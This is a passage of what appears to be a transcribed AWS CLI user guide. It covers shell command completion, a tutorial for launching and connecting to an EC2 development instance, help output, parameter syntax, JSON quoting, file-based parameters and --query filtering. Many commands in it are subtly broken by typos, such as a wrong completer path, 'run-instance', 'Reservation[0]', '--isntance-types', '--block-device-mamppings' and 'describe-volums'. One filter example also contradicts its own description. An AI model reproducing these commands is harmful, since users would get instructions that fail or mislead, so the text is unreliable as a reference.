    `$ rm -r ~/.aws/cache`
* Windows
    `> del /s /q %UserProfile%\.aws\cache`
###### Command Completion
On Unix-like systems, the AWS CLI includes a command-completion feature that enables you to use the **TAB** key to complete a partially typed command. This feature is not automatically installed so you need to configure it manually.
Configuring command completion requires two pieces of information: the name of the shell you are using and the location of the aws_completer script.
**Completion on Amazon Linux**
Command completion is configured by default on instances running Amazon Linux.
####### Identify Your Shell
If you are not sure which shell you are using, identify it with one of the following commands:
* `echo $SHELL`-show the shell's installation directory. This will usually match the in-use shell, unless you launched a different shell after logging in.
        
        $ echo $SHELL
        /bin/bash
* `ps`-show the processes running for the current user. The shell will be one of them.

        $ ps
          PID TTY       TIME CMD
        2148 pts/1      00:00:00 bash
        8756 pts/1      00:00:00 ps
####### Locate the AWS Completer
The location can vary depending on the installation method used.
* **Package Manager**-programs such as pip, yum, brew and apt-get typically install the AWS completer (or a symlink to it) to a standard path location. In this case, `which` will locate the completer for you.

        $ which aws_completer
        /usr/local/bin/aws_completer
* **Bundled Installer**-if you used the bundled installer per the instructions in the previous section, the AWS completer will be located in the `bin` subfolder of the installation directory.

        $ ls /usr/local/aws/bin
        activate
        activate.csh
        activate.fish
        activate_this.py
        aws
        aws.cmd
        aws_completer
        ...
If all else fails, you can use `find` to search your entire file system for the AWS completer.
`$ find / -name aws_completer`
`/usr/local/aws/bin/aws_completer`
####### Enable Command Completion
Run a command to enable command completion. The command that you use to enable completion depends on the shell that you are using. You can add the command to your shell's RC file to run it each time you open a new shell.
* **bash**-use the built-in command complete
    `$ complete -C '/usr/local/bin/aws_complete' aws`
    Add the command to `~/.bahsrc` to run it each time you open a new shell. Your `~/.bash_profile` should source `~/.bashrc` to ensure that the command is run in login shells as well.
####### Test Command Completion
After enabling command completion, type in a partial command and press TAB to see the available commands.

        $ aws sTAB
        s3  ses sqs sts swf
        s3api   sns storagegateway support

##### Deploying a Development Environment in Amazon EC2 Using the AWS Command Line Interface
This tutorial details how to set up a development environment in Amazon EC2 using the AWS CLI. It includes a short version of the installation and configuration instructions, and it can be run start to finish on Windows, Linux, macOS, or Unix.
###### Install the AWS CLI
You can install the AWS CLI with an installer (Windows) or by using pi, a package manager for Python.
* Windows
    Download the MSI installer.
    * [Download the AWS CLI MSI installer for Windows (64-bit)](https://s3.amazonaws.com/aws-cli/AWSCLI64.msi)
    * Download the AWS CLI MSI installer for Windows (32-bit)
* Linux, macOS, or Unix
    These steps require that you have a working installation of Python 2 version 2.6.5+ or Python 3 version 3.3+. If you encounter any issues using the following steps, see the full installation instructions in the AWS Command Line Interface User Guide.
    1. Download and run the installation script from the pip website:
        
        $ curl "https://bootstrap.pypa.io/get-pip.py" -o "get-pip.py"
        $ python get-pip.py --user
    2. Install the AWS CLI Using pip:

        $ pip install awscli --user
###### Configure the AWS CLI
Run `aws configure` at the command line to set up your credentials and settings.

        $ aws configure
        AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE
        AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
        Default region name [None]: us-east-2
        Default output format [None]: json
The AWS CLI will prompt you for the following information:
* **AWS Access Key ID and AWS Secret Access Key**-These are your account credentials. If you don't have keys, see How Do I Get Security Credentials? in the Amazon Web Services General Reference.
* **Default region name**-This is the name of region you want to make calls against by default.
* **Default output format**-This format can be either json, text, or table. If you don't specify an output format, json will be used.
Run a command to verify that your credentials are configured correctly and that you can connect to AWS.

        $ aws ec2 describe-regions --output table
        ----------------------------------------------------------
        |                     DescribeRegions                    |
        +--------------------------------------------------------+
        ||                        Regions                       ||
        |+-----------------------------------+------------------+|
        ||             Endpoint              |   RegionName     ||
        |+-----------------------------------+------------------+|
        ||  ec2.ap-south-1.amazonaws.com     |  ap-south-1      ||
        ||  ec2.eu-west-3.amazonaws.com      |  eu-west-3       ||
        ||  ec2.eu-west-2.amazonaws.com      |  eu-west-2       ||
        ||  ec2.eu-west-1.amazonaws.com      |  eu-west-1       ||
        ||  ec2.ap-northeast-3.amazonaws.com |  ap-northeast-3  ||
        ||  ec2.ap-northeast-2.amazonaws.com |  ap-northeast-2  ||
        ||  ec2.ap-northeast-1.amazonaws.com |  ap-northeast-1  ||
        ||  ec2.sa-east-1.amazonaws.com      |  sa-east-1       ||
        ||  ec2.ca-central-1.amazonaws.com   |  ca-central-1    ||
        ||  ec2.ap-southeast-1.amazonaws.com |  ap-southeast-1  ||
        ||  ec2.ap-southeast-2.amazonaws.com |  ap-southeast-2  ||
        ||  ec2.eu-central-1.amazonaws.com   |  eu-central-1    ||
        ||  ec2.us-east-1.amazonaws.com      |  us-east-1       ||
        ||  ec2.us-east-2.amazonaws.com      |  us-east-2       ||
        ||  ec2.us-west-1.amazonaws.com      |  us-west-1       ||
        ||  ec2.us-west-2.amazonaws.com      |  us-west-2       ||
        |+-----------------------------------+------------------+|
###### Create a Security Group and Key Pair for the EC2 Instance
Your next step is to set up prerequisities for launching an EC2 instance that can be accessed using SSH. For more information about Amazon EC2 features, go to the [Amazon EC2 User Guide for Linux Instances](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/concepts.html)
**To create a security group, key pair, and role**
1. First, create a new security group and add a rule that allows incoming traffic over  port 22 for SSH. If you are using the default VPC for the region, you can omit the `--vpc-id` parameter; otherwise, specify the ID of the VPC in which you'll launch your instance. For better security, replace the 0.0.0.0/0 CIDR range with the range of the network from which you'll connect to your instance.

        $ aws ec2 create-security-group --group-name devenv-sg --vpc-id vpc-xxxxxxxx --description "security group for development environment"
        {
          "GroupId":"sg-b018ced5"
        }
        $ aws ec2 authorize-security-group-ingress --group-name devenv-sg --protocol tcp --port 22 --cidr 0.0.0.0/0
Note the security group ID for later use when you launch the instance.
2. Next, create the key pair, which allows you to connect to the instance. This command saves the contents of the key to a file named *devenv-key.pem*.
`$ aws ec2 create-key-pair --key-name devenv-key --query 'KeyMaterial' --output text > devenv-key.pem`
**Windows**: In a Windows Command prompt, use double quotes instead of single quotes.
3. On Linux, you will also need to change the file mode so that only you have access to the key file.
`$ chmod 400 devenv-key.pem`
###### Launch and connect to the Instance
Finally, you are ready to launch instance and connect to it.
**To launch and connect to the instance**
1. Run the following command, using the ID of the security group that you created in the previous step. The `--image-id` parameter specifies the Amazon Machine Image (AMI) that Amazon EC2 uses to bootstrap the instance. You can find an image ID for your region and operating system using the Amazon EC2 console. If you are using the default subnet for a default VPC, you can omit the `--subnet-id` parameter; otherwise, specify the ID of the subnet in which you'll launch your instance.
`$ aws ec2 run-instance --image-id ami-xxxxxxxx --subnet-id subnet-xxxxxxxx --security-group-ids sg-b018ced5 --count 1 --instance-type t2.micro --key-name devenv-key --query 'Instances[0].InstanceId'`
`"i-0787e4282810ef9cf"`
2. The instance will take a few moments to launch. After the instance is up and running, you'll need the public IP address of the instance to connect to it. Use the following command to get the public IP address:
`$ aws ec2 describe-instances --instance-ids i-0787e4282810ef9cf --query 'Reservation[0].Instances[0].PublicIpAddress'`
`"54.183.22.255"`
3. To connect to the instance, use the public IP address and private key with your preferred terminal program. On Linux, macOS, or Unix, you can do this from the command line using the following command:
`$ ssh -i devenv-key.pem <user>@<54.183.22.255>`
If you get an error like *Permission denied (publickey)* when attempting to connect to your instance, check that the following are correct:
* **Key**-The key specified must be at the path indicated and must be the private key, not the public one. Permissions on the key must be restricted to the owner.
* **User**-The user name must match the default user name associated wit the AMI you used to launch the instance. For an Ubuntu AMI, this is *ubuntu*.
* **Instance**-The public IP address or DNS name of the instance. Verify that the address is public and that port 22 is open to your local machine on the instance's security group.
You can also use the `-v` option to view additional information related to the error.
**SSH on Windows**
On Windows, you can use the PuTTY terminal application available [here](https://www.chiark.greenend.org.uk/~sgtatham/putty/). Get putty.exe and puttygen.exe from the download page.
Use puttygen.exe to convert your private key to a .ppk file required by PuTTY. Launhc putty.exe, enter the public IP address of the instance in the **Host Name** field, and set the connection type to SSH.
In the **Category** panel, navigate to **Connection**>**SSH**>**Auth**, and click **Browse** to select your .ppk file, and then click **Open** to connect.
4. The terminal will prompt you to accept the server's public key. Type *yes* and click **Enter** to complete the connection.
You've now configured a security group, created a key pair, launched an EC2 instance, and connected to it without ever leaving the command line.
##### Using the AWS Command Line Interface
This section introduces the common features and calling patterns used throughout the AWS Command Line Interface.
**Note**: The AWS CLI makes API calls to services over HTTPS. Outbound connections on TCP port 443 must be enabled in order to perform calls.
###### Getting Help with the AWS Command Line Interface
To get help when using the AWS CLI, you can simply add `help` to the end of a command. For example, the following command lists help for the general AWS CLI options and the available top-level commands.
`$ aws help`
The following command lists the available subcommands for Amazon EC2.
`$ aws ec2 help`
The next example lists the detailed help for the EC2 DescribeInstances operation, including descriptions of it input parameters, filters, and output. Check the examples section of the help if you are not sure how to phrase a command.
`$ aws ec2 describe-instances help`
The help for each command is divided into six sections:
* **Name**-the name of the command.
    
        NAME
            describe-instances -
* **Description**-a description of the API operation that the command invokes, pulled from the API documentation for the command's service.

        DESCRIPTION
            Describe one or more of your instances.

            If you specify one or more instance IDs, Amazon EC2 returns information for those instances. If you do not specify instance IDs, Amazon EC2 returns information for all relevant instances. If you specify an instance ID that is not valid, an error is returned. If you spescify an instance that you do not own, it is not included in the returened results.
        ...
* **Synosis**-list of the command and its options. If an option is shown in square brackets, it is either optional, has a default value, or has an alternative option that can be used instead.

        SYNOPSIS
            describe-instances
           [--dry-run | --no-dry-run]
           [--instance-ids <value>]
           [--filters <value>]
           [--cli-input-json <value>]
           [--starting-token <value>]
           [--page-size <value>]
           [--max-items <value>]
           [--generate-cli-skeleton]
     `describe-instances` has a default behavior that describes all instances in the current account and region. You can optionally specify a list of `instance-ids` to describe one or more instances. `dry-run` is an optional boolean flag that doesn't take a value. To use a boolean flag, specify either shown value, in this case `--dry-run` or `--no-dry-run`. Likewise, `--generate-cli-skeleton` does not take a value. If there are conditions on an option's use, they should be described in the OPTIONS section, or shown in the examples.
* **Options**- description of each of the options shown in the synopsis.

        OPTIONS
            --dry-run | --no-dry-run (boolean)
              Checks whether you have the requred permissions for the action, without actually making the request, and provides an error response.
              If you have the required permissions, the error response is DryRun-Operation. Otherwise, it is UnauthorizedOperation.
            --instance-ids (list)
              One or more instance IDs.

              Default: Describes all your instances.
* **Examples**-examples showing the usage of the command and its options. If no example is available for a command or use case that you need, please request one using feedback link on this page, or in the AWS CLI command reference on the help page for the command.

        EXAMPLES
        To describe an Amazon EC2 instance
        Command:
        aws ec2 describe-instances --instance-ids i-5203422c

        To describe all instances with the instance type m1.small
        command:
        aws ec2 describe-instances --filters "Name=instance-type, Values=m1.small"

        To describe all instances with a Owner tag
        Command:
        aws ec2 describe-instances --filters "Name=tag-key,values=Owner"
        ...
* **Output**-descriptions of each of the fields and datatypes returned in the response from AWS.
    For describe-instances, the output is a list of reservation objects, each of which contains several fields and objects that contain information about the instance(s) associated with it. This information comes from the API documentation for the reservation datatype used by Amazon EC2.

        OUTPUT
            Reservations -> (list)
             One or more reservations.

             (structure)
                Describes a reservation.

                ReservationId -> (string)
                  The ID of the reservation.

                OwnerId -> (string)
                  The ID of the AWS account that owns the reservation.

                RequestId -> (string)
                  The ID of the requester that launched the instances on your behalf ( for example, AWS Management Console or Auto Scaling).

                Groups -> (list)
                  One or more security groups.

                  (structure)
                    Describe a security group.

                    GroupName -> (string)
                      The name of the security group.

                    GroupId -> (string)
                      The ID of the security group.

                Instances -> (list)
                   One or more instances.

                   (structure)
                     Describes an instance.

                     InstanceId -> (string)
                       The ID of the instance.

                     ImageId -> (string)
                       The ID of the AMI used to launch the instance.

                    State -> (structure)
                      The current state of the instance.

                      Code -> (integer)
                        The low byte represents the state. The high byte is an opaque internal value and should be ignored.
    When the output is rendered into JSON by the AWS CLI, it becomes an array of reservation objects, like this:

        {
          "Reservations":[
            {
              "OwnerId":"012345678901",
              "ReservationId":"r-4c58f8a0",
              "Groups":[]
              "RequesterId":"012345678901",
              "Instances":[
                {
                  "Monitoring":{
                    "State":"disabled"
                  },
                  "PublicDnsName":"ec2-52-74-16-12.us-west-2.compute.amazonaws.com",
                  "State":{
                    "Code":16,
                    "Name":"running"
                  },
            ...
    Each reservation object contains fields describing the reservation and an array of instance objects, each with its own fields (e.g. PublicDnsName) and objects (e.g. State) that describe it.
**Windows Users**
Pipe the output of the help command to more to view the help file one page at a time. Press the space bar or PageDown to view more of the document, and q to quit.
`> aws ec2 describe-instances help | more`
###### Command Structure
The AWS CLI uses a multipart structure on the command line. It starts with the base call to `aws`. The next part specifies a top-level command, which often represents an AWS service supported in the AWS CLI. Each AWS service has additional subcommands that specify the operation to perform. The general CLI options, or the specific parameters for an operation, can be specified on the command line in any order. If an exclusive parameter is specified multiple times, then only the *last value* applies.
`$ aws <command> <subcommand> [options and parameters]`
Parameters can take various types of input values, such as numbers, strings, lists, maps, and JSON structures.
###### Specifying Parameter Values
Many parameters are simple string or numeric values, such as the key pair name my-key-pair in the following example:
`$ aws ec2 create-key-pair --key-name my-key-pair`
Strings without any space characters may be quoted or unquoted. However, strings that include one or more space characters must be quoted. Use a single quote (') in Linux, macOS, or Unix and Windows PowerShell, or use a double quote (") in the Windows command prompt, as shown in the following examples.
**Windows PowerShell, Linux, macOS, or Unix**
`$ aws ec2 create-key-pair --key-name 'my key pair'`
**Windows Command Processor**
`> aws ec2 create-key-pair --key-name "my key pair"`
You can also use an equals sign instead of a space. This is typically only necessary if the value of the parameter starts with a hyphen:
`aws ec2 delete-key-pair --key-name=-mykey`
####### Common Parameter Types
The section describes some of the common parameter types and the format that the services expect them to conform to. If you are having trouble with the formatting of a parameter for a specific command, check the manual by typing `help` after the command name, for example:
`$ aws ec2 describe-spot-price-history help`
The help for each subcommand describes its function, options, output, and examples. The options section includes the name and description of each option with the option's parameter type in parentheses.
* **String**-String parameters can contain alphanumeric characters, symbols, and whitespace from the ASCII character set. Strings that contain whitespace must be surrounded by quotes. Use of symbols and whitespace other than the standard space character is not recommended and may cause issues when using the AWS CLI.
    Some string parameters can accept binary data from a file. See Binary Files for an example.
* **Timestamp**-Timestamps are formatted per the ISO 8601 standard. These are sometimes referred to as "Date Time" or "Date" type parameters.
    `$ aws ec2 describe-spot-price-history --start-time 2014-10-13T19:00:00Z`
    Acceptable formats include:
    * YYYY-MM-DDThh:mm:ss.sssTZD (UTC), e.g., 2014-10-01T20:30:00.000Z
    * YYYY-MM-DDThh:mm:ss.sssTZD (with offset), e.g., 2014-10-01T12:30:00.000-08:00
    * YYYY-MM-DD, e.g., 2014-10-01
    * Unix time in seconds, e.g. 1412195400
* **List**-One or more strings separated by spaces
    `$ aws ec2 describe-spot-price-history --isntance-types m1.xlarge m1.medium`
* **Boolean**-Binary flag that turns an option on or off. For example, `ec2 describe-spot-price-history` has a boolean `dry-run` parameter that, when specified, validates the command against the service without actually running a query.
    `$ aws ec2 describe-spot-price-history --dry-run`
    The output indicates where the command was well formed or not. This command also includes a `no-dry-run` version of the parameter that can be used to explicitly indicate that the command should be run normally, although including it is not necessary as this is the default behavior.
* **Integer**-An unsigned whole number.
    `$ aws ec2 describe-spot-price-history --max-items 5`
* **Blob**-Binary object. Blob parameters take a path to a local file that contains binary data. The path should not contain any protocol identifier such as `http://` or `file://`.
    The `--body` parameter for `aws s3api put-object` is a blob:
    `$ aws s3api put-object --bucket my-bucket --key testimage.png --body /tmp/image.png`
* **Map**-A sequence of key value pairs specified in JSON or shorthand syntax. The following example reads an item from a DynamoDB table named *my-table* with a map parameter, `--key`. The parameter specifies the primary key named *id* with a number value of *1* in a nested JSON structure.

        $ aws dynamodb get-item --table-name my-table --key '{"id":{"N":"1"}}'
         {
           "Item":{
              "name":{
                "S":"John"
              },
              "id":{
                "N":"1"
              }
            }
          }
The next section covers JSON arguments in more detail.
####### Using JSON for Parameters
JSON is useful for specifying complex command line parameters. For example, the following command will list all EC2 instances that have an instance type of m1.small or m1.medium that are also in the us-west-2c Availability Zone.
`$ aws ec2 describe-instances --filters "Name=instance-type,Values=t2.micro,m1.medium" "Name=availability-zone,Values=us-west-2c"`
The following example specifies the equivalent list of filters in a JSON array. Square brackets are used to create an array of JSON objects separated by commas. Each object is a comma separated list of key-value pairs ("Name" and "Values" are both keys in this instance).
Note that value to the right of the "Values" key is itself an array. This is required, even if the array contains only one value string.

        [
         {
          "Name":"instance-type",
          "Values":["t2.micro","m1.medium"]
          },
          {
           "Name":"availability-zone",
           "Values":["us-west-2c"]
          }
         ]
The outermost brackets, on the other hand, are only required if more than one filter is specified. A single filter version of the above command, formatted in JSON, looks like this:
`$ aws ec2 describe-instances --filters '{"Name":"instance-type","Values":["t2.micro","m1.medium"]}'`
Some operations require data to be formatted as JSON. For example, to pass parameters to the `--block-device-mappings` parameter in the `ec2 run-instances` command, you need to format the block device information as JSON.
This example shows the JSON to specify a single 20GiB Elastic Block Store device to be mapped at `/dev/sdb` on the launching instance.

        {
         "DeviceName":"/dev/sdb",
         "Ebs":{
          "VolumeSize":20,
          "DeleteOnTermination":false,
          "VolumeType":"standard"
          }
         }
To attack multiple devices, list the objects in an array like in the next example.

        [
         {
          "DeviceName":"/dev/sdb",
          "Ebs":{
           "VolumeSize":20,
           "DeleteOnTermination":false,
           "VolumeType":"standard"
           }
          },
          {
           "DeviceName":"/dev/sdc",
           "Ebs":{
            "VolumeSize":10,
            "DeleteOnTermination":true,
            "VolumeType":"standard"
            }
           }
          ]
You can either enter the JSON directly on the command line (see Quoting Strings), or save it to a file that is referenced from the command line (see Loading Parameters from a File).
When passing in large blocks of data, you might find it easier to save the JSON to a file and reference it from the command line. JSON data in a file is easier to read, edit, and share with others. This technique is described in the next section.
####### Quoting Strings
The way you enter JSON-formatted parameters on the command line differs depending upon your operating system. Linux, macOS, or Unix and Windows PowerShell use the single quote(') to enclose the JSON data structure, as in the following example:
`$ aws ec2 run-instances --image-id ami-05355a6c --block-device-mappings '[{"DeviceName":"/dev/sdb","Ebs":{"VolumeSize":20,"DeleteOnTermination":false,"VolumeType":"standard"}}]'`
The Windows command prompt, on the other hand, uses the double quote (") to enclose the JSON data structure. In addition, a backslash (\) escape character is required for each double quote (") within the JSON data structure it self, as in the following example:
`> aws ec2 run-instances --image-id ami-05355a6c --block-device-mappings "[{\"DeviceName\":\"/dev/sdb\",\"Ebs\":{\"VolumeSize\":20,\"DeleteOnTermination\":false,\"VolumeType\":\"standard\"}}]"`
Windows PowerShell requires a single quote (') to enclose the JSON data structure, as well as a backslash (\) to escape double quote (") within the JSON structure, as in the following example:
`> aws ec2 run-instances --image-id ami-05355a6c --block-device-mappings '[{\"DeviceName\":\"/dev/sdb\",\"Ebs\":{\"VolumeSize\":20,\"DeleteOnTermination\":false,\"VolumeType\":\"standard\"}}]'`
####### Loading Parameters from a File
To avoid the need to escape JSON strings at the command line, load the JSON from a file. Load parameters from a file by providing the path to the file using the `file://` prefix, as in the following examples.
* **Linux, macOS, or Unix**

        //Read from a file in the current directory
        $ aws ec2 describe-instances --filters file://filter.json

        //Read from a file in /tmp
        $ aws ec2 describe-instances --filters file:///tmp/filter.json
* **Windows**

        //Read from a file in C:\temp
        > aws ec2 describe-instances --filters file://C:\temp\filter.json
The `file://` prefix option supports Unix-style expansions including `~/`, `./`, and `../`. On Windows, the `~/` expression expands to your user directory, stored in the `%USERPROFILE%` environment variable. For example, on Windows 7 you would typically have a user directory under `C:\Users\User Name\``.
JSON documents that are provided as the value of a parameter key must still be escaped:
`$ aws sqs create-queue --queue-name my-queue --attributes file://attributes.json`

**attributes.json**

        {
         "RedrivePolicy":"{\"deadLetterTargetArn\":\"arn:aws:sqs:us-west-2:0123456789012:deadletter\",\"maxReceiveCount\":\"5\"}"
        }
* **Binary Files**
    For commands that take binary data as a parameter, specify that the data is binary content by using the `fileb://` prefix. Commands that accept binary data include:
    * `aws ec2 run-instances`- `--user-data` parameter
    * `aws s3api put-object`- `--sse-customer-key` parameter
    * `aws kms decrypt`- `--ciphertext-blob` parameter
    The following example generates a binary 256 bit AES key using a Linux command line tool and then provides it to Amazon S3 to encrypt an uploaded file server-side:

        $ dd if=/dev/urandom bs=1 count=32 > sse.key
        32+0 records in
        32+0 records out
        32 bytes (32 B) coppied, 0.000164441 s, 195 kB/s
        $ aws s3api put-object --bucket my-bucket --key test.txt --body test.txt --sse-customer-key fileb://sse.key --sse-customer-algorithm AES256
        {
         "SSECustomerKeyMD5": "iVg8oWa8sy714+FjtesrJg==",
         "SSECustomerAlgorithm": "AES256",
         "ETag": "\"a6118e84b76cf98bf04bbe14b6045c6c\""
        }

* **Remote Files**
    The AWS CLI also supports loading parameters from a file hosted on the Internet with an `http://` URL. The following example references a file in an Amazon S3 bucket. This allows you to access parameter files from any computer, but requires the file to be stored in a publically accessible location.
    `$ aws ec2 run-instances --image-id ami-a13d6891 --block-device-mamppings http://my-bucket.s3.amazonaws.com/filename.json`
    In the preceding examples, the `filename.json` file contains the following JSON data.

        [
         {
          "DeviceName":"/dev/sdb",
          "Ebs":{
           "VolumeSize":20,
           "DeleteOnTermination":false,
           "VolumeType":"standard"
           }
          }
         ]

###### Generate CLI Skeleton and CLI Input JSON Parameters
Most AWS CLI commands support `--generate-cli-skeleton` and `--cli-input-json` parameters that you can use to store parameters in JSON and read them from a file instead of typing them at the command line.
Generate CLI Skeleton outputs JSON that outlines all of the parameters that can be specified or the operation.
**To use `--generate-cli-skeleton` with aws ec2 run-instances**
1. Execute the `run-instances` command with the `--generate-cli-skeleton` option to view the JSON skeleton.

        $ aws ec2 run-instances --generate-cli-skeleton
        {
            "DryRun": true,
            "ImageId": "",
            "MinCount": 0,
            "MaxCount": 0,
            "KeyName": "",
            "SecurityGroups": [
                ""
            ],
            "SecurityGroupIds": [
                ""
            ],
            "UserData": "",
            "InstanceType": "",
            "Placement": {
                "AvailabilityZone": "",
                "GroupName": "",
                "Tenancy": ""
            },
            "KernelId": "",
            "RamdiskId": "",
            "BlockDeviceMappings": [
                {
                    "VirtualName": "",
                    "DeviceName": "",
                    "Ebs": {
                        "SnapshotId": "",
                        "VolumeSize": 0,
                        "DeleteOnTermination": true,
                        "VolumeType": "",
                        "Iops": 0,
                        "Encrypted": true
                    },
                    "NoDevice": ""
                }
            ],
            "Monitoring": {
                "Enabled": true
            },
            "SubnetId": "",
            "DisableApiTermination": true,
            "InstanceInitiatedShutdownBehavior": "",
            "PrivateIpAddress": "",
            "ClientToken": "",
            "AdditionalInfo": "",
            "NetworkInterfaces": [
                {
                    "NetworkInterfaceId": "",
                    "DeviceIndex": 0,
                    "SubnetId": "",
                    "Description": "",
                    "PrivateIpAddress": "",
                    "Groups": [
                        ""
                    ],
                    "DeleteOnTermination": true,
                    "PrivateIpAddresses": [
                        {
                            "PrivateIpAddress": "",
                            "Primary": true
                        }
                    ],
                    "SecondaryPrivateIpAddressCount": 0,
                    "AssociatePublicIpAddress": true
                }
            ],
            "IamInstanceProfile": {
                "Arn": "",
                "Name": ""
            },
            "EbsOptimized": true
        }

2. Direct the output to a file to save the skeleton locally:
`$ aws ec2 run-instances --generate-cli-skeleton > ec2runinst.json`
3. Open the skeleton in text editor and remove any parameters that you will not use:

        {
          "DryRun":true,
          "ImageId":"",
          "KeyName":"",
          "SecurityGroups":[
            ""
          ],
          "InstanceType":"",
          "Monitoring":{
            "Enabled":true
          }
         }
    Leave the DryRun parameter set to true to use EC2's dry run feature, which lets you test your configuration without creating resources.
4. Fill in the values for the instance type, key name, security group and AMI in you default region. In this example, `ami-dfc39aef` is a 64-bit Amazon Linux image in the `us-west-2` region.

        {
          "DryRun":true,
          "ImageId":"ami-dfc39aef",
          "KeyName":"mykey",
          "SecurityGroups":[
            "my-sg"
          ],
          "InstanceType":"t2.micro",
          "Monitoring":{
            "Enabled":true
          }
         }

5. Pass the JSON configuration to the `--cli-input-json` parameter using the `file://` prefix:

        $ aws ec2 run-instances --cli-input-json file://ec2runinst.json
        A client error (DryRunOperation) occurred when calling the RunInstances operation: Request would have succeeded, but DryRun flag is set.
    The dry run error indicates that the JSON is formed correctly and the parameter values are valid. If any other issues are reported in the output, fix them and repeat the above step until the dry run error is shown.
6. Set the DryRun parameter to false to disable the dry run feature.

        {
          "DryRun":false,
          "ImageId":"ami-dfc39aef",
          "KeyName":"mykey",
          "SecurityGroups":[
            "my-sg"
          ],
          "InstanceType":"t2.micro",
          "Monitoring":{
            "Enabled":true
          }
         }

7. Run the `run-instances` command again to launch an instance:

        $ aws ec2 run-instances --cli-input-json file://ec2runinst.json
        {
          "OwnerId":"123456789012",
          "ReservationId":"r-d94a2b1",
          "Groups":[],
          "Instances":[
        ...
###### Controlling Command Output from the AWS Command Line Interface
This section describes the different ways that you can control the output from the AWS CLI.
####### How to Select the Output Format
The AWS CLI supports three different output formats:
* JSON (json)
* Tab-delimited text (text)
* ASCII-formatted table (table)
As explained in the configuration topic, the output format can be specified in three different ways:
* Using the `output` option in the configuration file. The following example sets the output to text:

        [default]
        output=text
* Using the AWS_DEFAULT_OUTPUT environment variable. For example:
    `$ export AWS_DEFAULT_OUTPUT="table"`
* Using the `--output` option on the command line. For example:
    `$ aws swf list-domains --registration-status REGISTERED --output text`
**Note**:If the output format is specified in multiple ways, the usual AWS CLI precedence rules apply. For example, using the AWS_DEFAULT_OUTPUT environment variable overrides any value set in the config file with `output`, and a value passed to an AWS CLI command with `--output` overrides any value set in the environment or in the config file.
JSON is best for handling the output programmatically via various languages. The table format is easy for humans to read, and text format works well with traditional Unix text processing tools, such as `sed`, `grep`, and `awk`, as well as Windows PowerShell scripts.
####### How to Filter the Output with the `query` Option
The AWS CLI provides built-in output filtering capabilities with the `--query` option. To demonstrates how it works, we'll first start with the default JSON output below, which describes two EBS (Elastic Block Storage) volumes attached to separate EC2 instances.

        {
            "Volumes": [
                {
                    "AvailabilityZone": "us-west-2a",
                    "Attachments": [
                        {
                            "AttachTime": "2013-09-17T00:55:03.000Z",
                            "InstanceId": "i-a071c394",
                            "VolumeId": "vol-e11a5288",
                            "State": "attached",
                            "DeleteOnTermination": true,
                            "Device": "/dev/sda1"
                        }
                    ],
                    "VolumeType": "standard",
                    "VolumeId": "vol-e11a5288",
                    "State": "in-use",
                    "SnapshotId": "snap-f23ec1c8",
                    "CreateTime": "2013-09-17T00:55:03.000Z",
                    "Size": 30
                },
                {
                    "AvailabilityZone": "us-west-2a",
                    "Attachments": [
                        {
                            "AttachTime": "2013-09-18T20:26:16.000Z",
                            "InstanceId": "i-4b41a37c",
                            "VolumeId": "vol-2e410a47",
                            "State": "attached",
                            "DeleteOnTermination": true,
                            "Device": "/dev/sda1"
                        }
                    ],
                    "VolumeType": "standard",
                    "VolumeId": "vol-2e410a47",
                    "State": "in-use",
                    "SnapshotId": "snap-708e8348",
                    "CreateTime": "2013-09-18T20:26:15.000Z",
                    "Size": 8
                }
            ]
        }
First, we can display only the first volume from the Volumes list with the following command.

        $ aws ec2 describe-volumes --query 'Volumes[0]'
        {
            "AvailabilityZone": "us-west-2a",
            "Attachments": [
                {
                    "AttachTime": "2013-09-17T00:55:03.000Z",
                    "InstanceId": "i-a071c394",
                    "VolumeId": "vol-e11a5288",
                    "State": "attached",
                    "DeleteOnTermination": true,
                    "Device": "/dev/sda1"
                }
            ],
            "VolumeType": "standard",
            "VolumeId": "vol-e11a5288",
            "State": "in-use",
            "SnapshotId": "snap-f23ec1c8",
            "CreateTime": "2013-09-17T00:55:03.000Z",
            "Size": 30
        }
Now, we use the wildcard `[*]` to iterate the entire list and also filter out three elements: VolumeId, AvailabilityZone, and Size. Note that the dictionary notation requires that you provide an alias for each key, like this: `Alias1:Key1,Alias2:Key2}`. A dictionary is inherently *unordered*, so the ordering of the key-aliases within a structure may not be consistent in some cases.

        $ aws ec2 describe-volumes --query 'Volumes[*].{ID:VolumeId,AZ:AvailabilityZone,Size:Size}'
        [
          {
            "AZ":"us-west-2a",
            "ID":"vol-e11a5288",
            "Size":30
          },
          {
            "AZ":"us-west-2a",
            "ID":"vol-2e410a47",
            "Size":8
          }
         ]
In the dictionary notation, you can also use chained keys such as key1.key2[0].key3 to filter elements deeply nested within the structure. The example below demonstrates this with the Attachments[0].InstanceId key, aliased to simply InstanceId.

        $ aws ec2 describe-volumes --query 'Volumes[*].{ID:VolumeId,InstanceId:Attachements[0].InstanceId,AZ:AvailableZone,Size:Size}'
        [
          {
            "InstanceId":"i-a071c394",
            "AZ":"us-west-2a",
            "ID":"vol-e11a5288",
            "Size":30
          },
          {
            "InstanceId":"i-4b41a37c",
            "AZ":"us-west-2a",
            "ID":"vol-2e410a47",
            "Size":8
          }
        ]
You can also filter multiple elements with the list notation: [key1,key2]. This will format all filtered attributes into a single *ordered* list per object, regardless of type.

        $ aws ec2 describe-volumes --query 'Volumes[*].[VolumeId, Attachments[0],InstanceId,AvailableZone,Size]'
        [
          [
            "vol-e11a5288",
            "i-a071c394",
            "us-west-2a",
            30
          ],
          [
            "vol-2e410a47",
            "i-4b41a37c",
            "us-west-2a",
            8
          ]
         ]
To filter results by the value of a specific field, use the JMESPath `?` operator. The following example query outputs only volumes ion the us-west-2a availability zone:

        $ aws ec2 describe-volums --query 'Volumes[?AvailabilityZone==`us-west-2a`]'
**Note**: When specifying a literal value such as "us-west-2" above in a JMESPath query expression, you must surround the value in backticks (\`) in order for it to be read properly.
Combined with the three output formats that will be explained in more detail in the following sections, the `--query` option is a powerful tool you can use to customize the content and style of outputs.
####### JSON Output Format
JSON is the default output format of the AWS CLI. Most languages can easily decode JSON strings using built-in functions or with publicly available libraries. As shown in the previous topic along with the output examples, the `--query` option provides powerful ways to filter and format the AWS CLI's JSON formatted output. If you need more advanced features that may not be possible with `--query`, you can check out jq, a command line JSON processor.
####### Test Output Format
The *text* format organizes the AWS CLI's output into tab-delimited lines. It works well with traditional Unix text tools such as grep, sed, and awk, as well as Windows PowerShell.
